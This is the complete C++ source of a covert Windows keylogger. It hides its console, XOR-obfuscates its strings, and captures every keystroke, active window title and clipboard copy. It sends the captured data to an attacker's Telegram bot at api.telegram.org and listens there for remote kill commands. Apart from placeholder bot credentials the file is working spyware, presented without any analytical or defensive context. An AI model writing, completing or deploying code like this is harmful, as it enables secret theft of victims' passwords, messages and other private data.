#include <Windows.h>
#include <iostream>
#include <string>
#include <winhttp.h>
#include <thread>
template <size_t N>
struct ObfW {
    wchar_t d[N];
    constexpr ObfW(const wchar_t* s) : d{0} {
        for (size_t i = 0; i < N - 1; ++i) d[i] = s[i] ^ 0x5A;
    }
    std::wstring get() const {
        std::wstring r;
        for (size_t i = 0; i < N - 1; ++i) r += d[i] ^ 0x5A;
        return r;
    }
};
#define OW(s) (ObfW<sizeof(s)/sizeof(wchar_t)>(s).get())
template <size_t N>
struct ObfA {
    char d[N];
    constexpr ObfA(const char* s) : d{0} {
        for (size_t i = 0; i < N - 1; ++i) d[i] = s[i] ^ 0x5A;
    }
    std::string get() const {
        std::string r;
        for (size_t i = 0; i < N - 1; ++i) r += d[i] ^ 0x5A;
        return r;
    }
};
#define OA(s) (ObfA<sizeof(s)>(s).get())
const std::wstring BOT_TOKEN = OW(L"YOUR_BOT_TOKEN_HERE");
const std::wstring CHAT_ID = OW(L"YOUR_CHAT_ID_HERE");
std::string current_buffer = "";
std::string last_window = "";
const size_t BUFFER_LIMIT = 1024; 
std::string global_comp_name = "";
void send_tg_sync(std::string text) {
  if (text.empty()) return;
  HINTERNET hSession = WinHttpOpen(OW(L"Mozilla/5.0").c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) return;
  HINTERNET hConnect = WinHttpConnect(hSession, OW(L"api.telegram.org").c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect) {
    std::wstring path = OW(L"/bot") + BOT_TOKEN + OW(L"/sendMessage?chat_id=") + CHAT_ID;
    std::string encoded_text;
    for (char c : text) {
      if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
        encoded_text += c;
      } else {
        char buf[4];
        sprintf_s(buf, "%%%02X", (unsigned char)c);
        encoded_text += buf;
      }
    }
    std::string post_data = OA("text=") + encoded_text;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, OW(L"POST").c_str(), path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (hRequest) {
      std::wstring headers = OW(L"Content-Type: application/x-www-form-urlencoded\r\n");
      WinHttpSendRequest(hRequest, headers.c_str(), -1, (LPVOID)post_data.c_str(), (DWORD)post_data.length(), (DWORD)post_data.length(), 0);
      WinHttpReceiveResponse(hRequest, NULL);
      WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
  }
  WinHttpCloseHandle(hSession);
}
void send_tg(const std::string &text) {
    if (text.empty()) return;
    std::thread(send_tg_sync, text).detach();
}
int last_update_id = 0;
void init_tg_poll() {
    HINTERNET hSession = WinHttpOpen(OW(L"Mozilla/5.0").c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;
    HINTERNET hConnect = WinHttpConnect(hSession, OW(L"api.telegram.org").c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConnect) {
        std::wstring path = OW(L"/bot") + BOT_TOKEN + OW(L"/getUpdates?offset=-1");
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, OW(L"GET").c_str(), path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (hRequest) {
            if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {
                DWORD size = 0;
                DWORD downloaded = 0;
                std::string response;
                do {
                    WinHttpQueryDataAvailable(hRequest, &size);
                    if (size > 0) {
                        char* buf = new char[size + 1];
                        WinHttpReadData(hRequest, (LPVOID)buf, size, &downloaded);
                        buf[downloaded] = '\0';
                        response += buf;
                        delete[] buf;
                    }
                } while (size > 0);
                size_t update_id_pos = response.rfind(OA("\"update_id\":"));
                if (update_id_pos != std::string::npos) {
                    size_t start = update_id_pos + 12;
                    size_t end = response.find(OA(","), start);
                    if (end != std::string::npos) {
                        try {
                            last_update_id = std::stoi(response.substr(start, end - start));
                        } catch (...) {}
                    }
                }
            }
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
}
void poll_tg() {
    init_tg_poll(); 
    while (true) {
        Sleep(5000); 
        HINTERNET hSession = WinHttpOpen(OW(L"Mozilla/5.0").c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) continue;
        HINTERNET hConnect = WinHttpConnect(hSession, OW(L"api.telegram.org").c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            std::wstring path = OW(L"/bot") + BOT_TOKEN + OW(L"/getUpdates?offset=") + std::to_wstring(last_update_id + 1) + OW(L"&timeout=5");
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, OW(L"GET").c_str(), path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {
                    DWORD size = 0;
                    DWORD downloaded = 0;
                    std::string response;
                    do {
                        WinHttpQueryDataAvailable(hRequest, &size);
                        if (size > 0) {
                            char* buf = new char[size + 1];
                            WinHttpReadData(hRequest, (LPVOID)buf, size, &downloaded);
                            buf[downloaded] = '\0';
                            response += buf;
                            delete[] buf;
                        }
                    } while (size > 0);
                    if (response.length() > 5) { 
                        size_t update_id_pos = response.rfind(OA("\"update_id\":"));
                        if (update_id_pos != std::string::npos) {
                            size_t start = update_id_pos + 12;
                            size_t end = response.find(OA(","), start);
                            if (end != std::string::npos) {
                                try {
                                    last_update_id = std::stoi(response.substr(start, end - start));
                                } catch (...) {}
                            }
                        }
                        char compName[MAX_COMPUTERNAME_LENGTH + 1];
                        DWORD compNameLen = sizeof(compName);
                        GetComputerNameA(compName, &compNameLen);
                        std::string kill_cmd = OA("\"text\":\"/kill ") + std::string(compName) + OA("\"");
                        std::string kill_all_cmd = OA("\"text\":\"/kill_all\"");
                        if (response.find(kill_cmd) != std::string::npos || response.find(kill_all_cmd) != std::string::npos) {
                            send_tg_sync(OA("[\xE2\x98\xA0] Received kill command. Self-terminating instance on: ") + std::string(compName));
                            ExitProcess(0);
                        }
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}
void track_window() {
    HWND fg = GetForegroundWindow();
    if (fg) {
        char title[256];
        if (GetWindowTextA(fg, title, 256) > 0) {
            std::string t(title);
            if (t != last_window) {
                last_window = t;
                current_buffer += "\n\n\xE2\x96\xBA [" + global_comp_name + " | " + t + "]\n"; 
            }
        }
    }
}
std::string get_key_char(USHORT vk, USHORT flags) {
  if (flags & RI_KEY_BREAK) return ""; 
  BYTE k_state[256];
  GetKeyboardState(k_state);
  WORD asc;
  int status = ToAscii(vk, MapVirtualKey(vk, MAPVK_VK_TO_VSC), k_state, &asc, 0);
  if (status == 1) {
    char c = (char)asc;
    if (c >= 32 && c <= 126) return std::string(1, c);
  }
  switch (vk) {
  case VK_RETURN: return OA("[ENT]\n");
  case VK_SPACE: return " ";
  case VK_BACK: return OA("[BS]");
  case VK_TAB: return OA("[TAB]");
  case VK_ESCAPE: return OA("[ESC]");
  case VK_LCONTROL: case VK_RCONTROL: return OA("[CTRL]");
  case VK_LMENU: case VK_RMENU: return OA("[ALT]");
  }
  return "";
}
HWND nxt_clip_viewer;
LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
  switch (msg) {
  case WM_CREATE:
      nxt_clip_viewer = SetClipboardViewer(hwnd);
      break;
  case WM_CHANGECBCHAIN:
      if ((HWND)wp == nxt_clip_viewer) {
          nxt_clip_viewer = (HWND)lp;
      } else if (nxt_clip_viewer != NULL) {
          SendMessage(nxt_clip_viewer, msg, wp, lp);
      }
      break;
  case WM_DRAWCLIPBOARD: {
      if (OpenClipboard(hwnd)) {
          if (IsClipboardFormatAvailable(CF_TEXT)) {
              HANDLE h_data = GetClipboardData(CF_TEXT);
              if (h_data != NULL) {
                  char* txt = static_cast<char*>(GlobalLock(h_data));
                  if (txt != NULL) {
                      std::string clip_content(txt);
                      GlobalUnlock(h_data);
                      if (!current_buffer.empty()) {
                          send_tg(current_buffer);
                          current_buffer.clear();
                      }
                      std::string alert = OA("\n\n\xE2\x9C\x82 [CLIPBOARD COPIED on ") + global_comp_name + OA("]\n") + clip_content + "\n";
                      send_tg(alert);
                  }
              }
          }
          CloseClipboard();
      }
      if (nxt_clip_viewer != NULL) {
          SendMessage(nxt_clip_viewer, msg, wp, lp);
      }
      break;
  }
  case WM_INPUT: {
    UINT size;
    GetRawInputData((HRAWINPUT)lp, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
    if (size == 0) return 0;
    LPBYTE buffer = new BYTE[size];
    if (GetRawInputData((HRAWINPUT)lp, RID_INPUT, buffer, &size, sizeof(RAWINPUTHEADER)) != size) {
      delete[] buffer;
      return 0;
    }
    RAWINPUT *raw_data = (RAWINPUT *)buffer;
    if (raw_data->header.dwType == RIM_TYPEKEYBOARD) {
      std::string key_str = get_key_char(raw_data->data.keyboard.VKey, raw_data->data.keyboard.Flags);
      if (!key_str.empty()) {
        track_window(); 
        std::string bs_marker = OA("[BS]");
        if (key_str == bs_marker && !current_buffer.empty()) {
            if (current_buffer.back() == ']') {
                 size_t last_bracket = current_buffer.find_last_of('[');
                 if (last_bracket != std::string::npos) {
                     current_buffer.erase(last_bracket);
                 } else {
                     current_buffer.pop_back(); 
                 }
            } else if (current_buffer.back() != '\n') {
                current_buffer.pop_back();
            }
        } else if (key_str != bs_marker) {
            current_buffer += key_str;
        }
        std::string ent_marker = OA("[ENT]");
        if (current_buffer.length() >= BUFFER_LIMIT || key_str.find(ent_marker) != std::string::npos) {
          if (!current_buffer.empty()) {
              send_tg(current_buffer);
              current_buffer.clear();
          }
        }
      }
    }
    delete[] buffer;
    break;
  }
  case WM_DESTROY:
    ChangeClipboardChain(hwnd, nxt_clip_viewer);
    if (!current_buffer.empty()) send_tg_sync(current_buffer);
    PostQuitMessage(0);
    break;
  default:
    return DefWindowProc(hwnd, msg, wp, lp);
  }
  return 0;
}
int main() {
  std::string mutexName = OA("RawLoggerMutex_v2");
  HANDLE hMutex = CreateMutex(NULL, TRUE, mutexName.c_str());
  if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
  ShowWindow(GetConsoleWindow(), SW_HIDE);
  char compName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD compNameLen = sizeof(compName);
  GetComputerNameA(compName, &compNameLen);
  global_comp_name = compName;
  std::string startupMsg = OA("[\xE2\x9A\xA1] Logger started on: ") + std::string(compName) + OA("\n---");
  send_tg(startupMsg);
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)poll_tg, NULL, 0, NULL);
  WNDCLASS wc = {0};
  wc.lpfnWndProc = wnd_proc;
  wc.hInstance = GetModuleHandle(NULL);
  std::string className = OA("KLogCls");
  wc.lpszClassName = className.c_str();
  RegisterClass(&wc);
  HWND hwnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
  if (!hwnd) return 1;
  RAWINPUTDEVICE rid;
  rid.usUsagePage = 0x01;
  rid.usUsage = 0x06;
  rid.dwFlags = RIDEV_INPUTSINK;
  rid.hwndTarget = hwnd;
  if (!RegisterRawInputDevices(&rid, 1, sizeof(rid))) return 1;
  MSG m;
  while (GetMessage(&m, NULL, 0, 0)) {
    TranslateMessage(&m);
    DispatchMessage(&m);
  }
  if (hMutex) {
      ReleaseMutex(hMutex);
      CloseHandle(hMutex);
  }
  return 0;
}
